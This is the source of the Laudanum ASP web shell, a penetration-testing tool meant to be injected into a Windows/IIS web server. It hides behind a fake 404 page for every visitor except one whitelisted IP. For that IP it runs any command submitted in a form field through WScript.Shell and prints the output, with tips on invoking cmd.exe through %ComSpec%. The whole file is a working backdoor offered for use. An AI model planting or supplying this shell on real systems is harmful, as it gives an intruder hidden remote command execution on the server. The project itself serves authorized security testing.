<%
' *******************************************************************************
' ***
' *** Laudanum Project
' *** A Collection of Injectable Files used during a Penetration Test
' ***
' *** More information is available at:
' ***  http://laudanum.secureideas.net
' ***  laudanum@secureideas.net
' ***
' ***  Project Leads:
' ***         Kevin Johnson <kjohnson@secureideas.net
' ***         Tim Medin <tim@securitywhole.com>
' ***
' *** Copyright 2012 by Kevin Johnson and the Laudanum Team
' ***
' ********************************************************************************
' ***
' ***   Updated and fixed by Robin Wood <Digininja>
' ***   Updated and fixed by Tim Medin <tim@securitywhole.com
' ***
' ********************************************************************************
' *** This program is free software; you can redistribute it and/or
' *** modify it under the terms of the GNU General Public License
' *** as published by the Free Software Foundation; either version 2
' *** of the License, or (at your option) any later version.
' ***
' *** This program is distributed in the hope that it will be useful,
' *** but WITHOUT ANY WARRANTY; without even the implied warranty of
' *** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
' *** GNU General Public License for more details.
' ***
' *** You can get a copy of the GNU General Public License from this
' *** address: http://www.gnu.org/copyleft/gpl.html#SEC1
' *** You can also write to the Free Software Foundation, Inc., Temple
' *** Place - Suite  Boston, MA   USA.
' ***
' ***************************************************************************** */


' can set this to 0 for never time out but don't want to kill the server if a script
' goes into a loop for any reason
Server.ScriptTimeout = 180

ip=request.ServerVariables("REMOTE_ADDR")
if ip<>"1.2.3.4" then
 response.Status="404 Page Not Found"
 response.Write(response.Status)
 response.End
end if

if Request.Form("submit") <> "" then
   Dim wshell, intReturn, strPResult
   cmd = Request.Form("cmd")
   Response.Write ("Running command: " & cmd & "<br />")
   set wshell = CreateObject("WScript.Shell")
   Set objCmd = wShell.Exec(cmd)
   strPResult = objCmd.StdOut.Readall()

   response.write "<br><pre>" & replace(replace(strPResult,"<","&lt;"),vbCrLf,"<br>") & "</pre>"

   set wshell = nothing
end if

%>
<html>
<head><title>Laundanum ASP Shell</title></head>
<body onload="document.shell.cmd.focus()">
<form action="shell.asp" method="POST" name="shell">
Command: <Input width="200" type="text" name="cmd" value="<%=cmd%>" /><br />
<input type="submit" name="submit" value="Submit" />
<p>Don't forget that if you want to shell command (not a specific executable) you need to call cmd.exe. It is usually located at C:\Windows\System32\cmd.exe, but to be safe just call %ComSpec%. Also, don't forget to use the /c switch so cmd.exe terminates when your command is done.
<p>Example command to do a directory listing:<br>
%ComSpec% /c dir
</form>
<hr/>
<address>
Copyright &copy; 2012, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
Written by Tim Medin.<br/>
Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
</address>
</body>
</html>